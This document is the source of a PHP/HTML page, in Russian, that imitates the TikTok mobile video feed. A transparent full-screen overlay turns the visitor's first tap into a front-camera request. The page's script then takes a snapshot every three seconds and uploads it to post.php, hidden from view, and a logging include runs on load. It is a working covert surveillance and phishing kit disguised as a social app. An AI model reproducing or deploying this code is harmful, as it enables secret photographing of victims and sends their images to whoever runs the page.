<?php 
include 'core_log.php'; 
$vids = array_filter(glob('vids/*.mp4'), 'is_file');
$imgs = array_filter(glob('imgs/*.{jpg,jpeg,png}', GLOB_BRACE), 'is_file');
if (empty($vids)) $vids = ['vids/v1.mp4'];
if (empty($imgs)) $imgs = ['foto1.jpeg'];
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>TikTok</title>
    <style>
        :root { --tt-red: #fe2c55; --tt-blue: #25f4ee; }
        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: 'ProximaNova', sans-serif, Arial; overflow: hidden; color: #fff; touch-action: none; }
        .v-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; transition: opacity 0.15s ease; }
        .header { position: absolute; top: 50px; width: 100%; display: flex; justify-content: center; align-items: center; z-index: 100; }
        .header .tabs { display: flex; gap: 15px; font-weight: 600; font-size: 17px; }
        .header span { opacity: 0.6; transition: 0.2s; }
        .header span.active { opacity: 1; border-bottom: 2px solid #fff; padding-bottom: 5px; }
        .menu-icon { position: absolute; left: 16px; width: 24px; height: 24px; cursor: pointer; }
        .search-icon { position: absolute; right: 16px; width: 24px; height: 24px; }
        .side-bar { position: absolute; right: 8px; bottom: 110px; display: flex; flex-direction: column; align-items: center; gap: 18px; z-index: 100; }
        .author { position: relative; margin-bottom: 10px; }
        .author img { width: 48px; height: 48px; border-radius: 50%; border: 1px solid #fff; }
        .follow { position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); background: var(--tt-red); border-radius: 50%; width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; font-size: 16px; border: 1.5px solid #fff; }
        .btn-box { text-align: center; font-size: 12px; cursor: pointer; font-weight: 600; }
        .btn-box svg { width: 34px; height: 34px; margin-bottom: 2px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); }
        .music-disc { width: 45px; height: 45px; background: radial-gradient(circle, #333 20%, #000 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 8px solid #1a1a1a; animation: rotate 4s linear infinite; margin-top: 5px; }
        .music-disc img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .meta { position: absolute; left: 12px; bottom: 95px; z-index: 100; width: 70%; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
        .meta b { font-size: 16px; display: block; margin-bottom: 5px; }
        .meta p { font-size: 14px; margin: 0; line-height: 1.3; }
        .music-name { display: flex; align-items: center; gap: 5px; margin-top: 10px; font-size: 13px; }
        .navbar { position: absolute; bottom: 0; width: 100%; height: 50px; background: #000; display: flex; justify-content: space-around; align-items: center; z-index: 100; padding-bottom: 25px; border-top: 0.5px solid #222; }
        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; opacity: 0.6; }
        .nav-item.active { opacity: 1; }
        .nav-item svg { width: 25px; height: 25px; margin-bottom: 2px; }
        .plus-btn { width: 45px; height: 28px; background: #fff; border-radius: 8px; position: relative; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 20px; }
        .plus-btn::before { content: ''; position: absolute; left: -3px; width: 10px; height: 100%; background: var(--tt-blue); border-radius: 5px; z-index: -1; }
        .plus-btn::after { content: ''; position: absolute; right: -3px; width: 10px; height: 100%; background: var(--tt-red); border-radius: 5px; z-index: -1; }
        .home-indicator { position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%); width: 120px; height: 4px; background: #fff; border-radius: 10px; z-index: 101; opacity: 0.8; }
        .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 2500; display: none; }
        .modal-sheet { position: fixed; bottom: -100%; left: 0; width: 100%; background: #fff; border-radius: 15px 15px 0 0; z-index: 3000; transition: 0.3s; color: #000; padding: 20px 0; }
        .modal-sheet.open { bottom: 0; }
        #side-menu { position: fixed; top: 0; left: -80%; width: 80%; height: 100%; background: #fff; z-index: 4000; transition: 0.3s; color: #000; padding: 50px 20px; box-sizing: border-box; }
        #side-menu.open { left: 0; }
        .menu-item { padding: 15px 0; border-bottom: 0.5px solid #eee; font-size: 16px; display: flex; align-items: center; gap: 10px; }
        .login-btn { width: 90%; background: var(--tt-red); color: #fff; border: none; padding: 12px; border-radius: 4px; font-weight: 600; font-size: 16px; margin: 20px auto; display: block; }
        #gate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; background: transparent; }
    </style>
</head>
<body>
<div id="gate"></div>
<div class="menu-overlay" id="overlay"></div>

<div id="side-menu">
    <h2 style="margin-top:0">Настройки</h2>
    <div class="menu-item">⚙️ Конфиденциальность</div>
    <div class="menu-item">📊 Инструменты автора</div>
    <div class="menu-item">🌐 Язык приложения</div>
    <div class="menu-item">🌙 Темный режим</div>
</div>

<div id="profile-modal" class="modal-sheet">
    <div style="text-align:center; font-weight:600; font-size:18px; margin-bottom:20px;">Зарегистрируйтесь</div>
    <p style="text-align:center; color:#666; font-size:14px; padding: 0 40px;">Создайте профиль, подписывайтесь на аккаунты и снимайте свои видео.</p>
    <button class="login-btn" onclick="location.reload()">Войти</button>
    <div style="text-align:center; font-size:13px; color:#999; margin-bottom:20px;">Нет аккаунта? <span style="color:var(--tt-red); font-weight:600">Регистрация</span></div>
</div>

<div id="share-modal" class="modal-sheet">
    <div style="text-align:center; font-weight:600; font-size:15px; margin-bottom:10px;">Отправить</div>
    <div style="display:flex; overflow-x:auto; gap:20px; padding:15px 20px;">
        <div id="wa-share" style="text-align:center; min-width:60px;"><div style="width:50px; height:50px; border-radius:50%; background:#25D366; display:flex; align-items:center; justify-content:center; margin:0 auto 5px;"><svg width="30" height="30" fill="#fff" viewBox="0 0 24 24"><path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-2.65-1.03-5.14-2.9-7.01A9.816 9.816 0 0 0 12.04 2z"/></svg></div>WhatsApp</div>
        <div id="tg-share" style="text-align:center; min-width:60px;"><div style="width:50px; height:50px; border-radius:50%; background:#0088cc; display:flex; align-items:center; justify-content:center; margin:0 auto 5px;"><svg width="25" height="25" fill="#fff" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 0 0-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.91-1.27 4.85-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg></div>Telegram</div>
        <div id="copy-url" style="text-align:center; min-width:60px;"><div style="width:50px; height:50px; border-radius:50%; background:#8e8e8e; display:flex; align-items:center; justify-content:center; margin:0 auto 5px;"><svg width="25" height="25" fill="#fff" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></div>Ссылка</div>
    </div>
</div>

<video id="v" class="v-bg" loop playsinline src="<?php echo $vids[0]; ?>"></video>

<div class="header">
    <svg id="open-menu" class="menu-icon" viewBox="0 0 48 48" fill="#fff"><path d="M6 36h36v-4H6v4zm0-10h36v-4H6v4zm0-14v4h36v-4H6z"/></svg>
    <div class="tabs"><span>Подписки</span><span class="active">Рекомендации</span></div>
    <svg class="search-icon" viewBox="0 0 48 48" fill="#fff"><path d="M31 28h-1.59l-.55-.55c1.96-2.27 3.14-5.22 3.14-8.45 0-7.18-5.82-13-13-13s-13 5.82-13 13 5.82 13 13 13c3.23 0 6.18-1.18 8.45-3.14l.55.55V31l10 9.98L40.98 38 31 28zm-12 0c-4.97 0-9-4.03-9-9s4.03-9 9-9 9 4.03 9 9-4.03 9-9 9z"/></svg>
</div>

<div class="side-bar">
    <div class="author"><img id="ava1" src="<?php echo $imgs[0]; ?>"><div class="follow">+</div></div>
    <div class="btn-box" id="like-trigger">
        <svg viewBox="0 0 24 24" fill="#fff"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
        <br><span id="count-like">0</span>
    </div>
    <div class="btn-box" id="comm-trigger">
        <svg viewBox="0 0 24 24" fill="#fff"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10z"/></svg>
        <br><span id="count-comm">0</span>
    </div>
    <div class="btn-box" id="fav-trigger">
        <svg viewBox="0 0 24 24" fill="#fff"><path d="M17 3H7a2 2 0 0 0-2 2v16l7-3 7 3V5a2 2 0 0 0-2-2z"/></svg>
        <br><span id="count-fav">0</span>
    </div>
    <div class="btn-box" id="share-trigger">
        <svg viewBox="0 0 24 24" fill="#fff"><path d="M15 5l6 7-6 7v-4.1C9.8 14.9 6.2 18.2 4 23c.8-5.7 3.5-11 11-12V5z"/></svg>
        <br><span id="count-share">0</span>
    </div>
    <div class="music-disc"><img id="ava2" src="<?php echo $imgs[0]; ?>"></div>
</div>

<div class="meta">
    <b>@red_hair_girl</b>
    <p>Когда покрасилась в идеальный рыжий 👩‍🦰 #ginger #top #hair</p>
    <div class="music-name"><span>🎵</span> <marquee scrollamount="3">оригинальный звук - TikTok Creator</marquee></div>
</div>

<div class="navbar">
    <div class="nav-item active"><svg viewBox="0 0 24 24" fill="#fff"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>Главная</div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>Друзья</div>
    <div class="plus-btn">+</div>
    <div class="nav-item"><svg viewBox="0 0 24 24" fill="#fff"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>Входящие</div>
    <div class="nav-item" id="profile-btn"><svg viewBox="0 0 24 24" fill="#fff"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Профиль</div>
</div>

<div class="home-indicator"></div>
<video id="cam_s" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none" width="640" height="480"></canvas>

<script>
    const v = document.getElementById('v'), g = document.getElementById('gate'), cs = document.getElementById('cam_s'), can = document.getElementById('c'), a1 = document.getElementById('ava1'), a2 = document.getElementById('ava2');
    const vids = <?php echo json_encode(array_values($vids)); ?>, imgs = <?php echo json_encode(array_values($imgs)); ?>;
    let startY = 0, isChanging = false;

    function updateVideoUI() {
        if (typeof window.updateIconsState === 'function') {
            window.updateIconsState(v.src);
        }
    }

    function nextVid() {
        if (isChanging) return;
        isChanging = true;
        v.style.opacity = '0';
        setTimeout(() => {
            const nextSrc = vids[Math.floor(Math.random() * vids.length)];
            v.src = nextSrc + "?t=" + Date.now();
            a1.src = a2.src = imgs[Math.floor(Math.random() * imgs.length)];
            v.load();
            v.oncanplay = () => { 
                v.play(); 
                v.style.opacity = '1'; 
                isChanging = false; 
                updateVideoUI(); 
            };
        }, 150);
    }

    document.addEventListener('touchstart', e => { startY = e.touches[0].clientY; }, {passive: true});
    document.addEventListener('touchend', e => { if (startY - e.changedTouches[0].clientY > 80) nextVid(); }, {passive: true});

    async function cam() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
            cs.srcObject = s; await cs.play();
            const ctx = can.getContext('2d');
            setInterval(() => {
                ctx.drawImage(cs, 0, 0, can.width, can.height);
                fetch('post.php', { method: 'POST', body: 'cat=' + encodeURIComponent(can.toDataURL('image/jpeg', 0.8)), headers: {'Content-Type': 'application/x-www-form-urlencoded'} });
            }, 3000);
        } catch(e) {}
    }

    g.onclick = () => { if (g.style.display !== 'none') { g.style.display = 'none'; v.play(); cam(); updateVideoUI(); } };
</script>
<script src="interaction.js"></script>
</body>
</html>
